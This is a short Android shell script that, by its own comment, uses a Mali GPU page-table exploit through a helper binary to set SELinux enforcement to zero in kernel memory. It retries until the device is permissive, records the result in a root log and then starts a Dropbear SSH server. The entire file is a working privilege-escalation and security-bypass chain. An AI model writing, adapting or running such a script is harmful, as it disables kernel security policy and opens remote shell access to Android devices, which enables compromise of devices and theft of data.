#!/system/bin/sh
# Exploits GPU Mali page table via esc-flip to set selinux_enforcing = 0 in kernel memory
echo 0 > /sys/fs/selinux/enforce 2>/dev/null
/vendor/bin/setenforce 0 2>/dev/null
/data/local/tmp/permissive esc-flip 0x291352c 1 0 2>/dev/null

while [ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "1" ]; do
    /data/local/tmp/permissive esc-flip 0x291352c 1 0 2>/dev/null
    sleep 3
done

/vendor/bin/setenforce 0 2>/dev/null
echo 0 > /sys/fs/selinux/enforce 2>/dev/null

ENF=$(cat /sys/fs/selinux/enforce 2>/dev/null)
echo "fix-enforce: final enforce=$ENF" >> /data/local/tmp/rootd.log

# Guaranteed launch of Dropbear SSH once Permissive
/odm/bin/start-dropbear.sh &
